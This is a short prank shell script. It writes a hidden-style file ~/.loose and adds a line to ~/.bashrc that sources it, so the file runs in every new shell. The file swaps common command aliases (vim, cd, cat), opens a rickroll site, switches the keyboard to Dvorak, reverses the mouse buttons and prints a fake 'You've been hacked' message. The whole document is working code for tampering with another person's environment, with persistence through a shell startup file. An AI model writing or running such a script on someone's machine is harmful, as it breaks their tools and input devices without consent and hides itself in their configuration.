#!/bin/sh

cat <<EOF > ~/.loose
alias vim=emacs
alias cd=ls
alias cat=cd

google-chrome rickroll.fr     2&>/dev/null
setxkbmap dvorak              2&>/dev/null
xset mouse 3 0                2&>/dev/null
xmodmap -e "pointer = 3 2 1"  2&>/dev/null
echo "You've been hacked, you are using a Dvorak keyboard, to 'repair' your computer, you need to undo everything in ~/.loose file"
EOF

grep .loose ~/.bashrc 2>/dev/null || echo "source ~/.loose" >> ~/.bashrc

#. ~/.loose
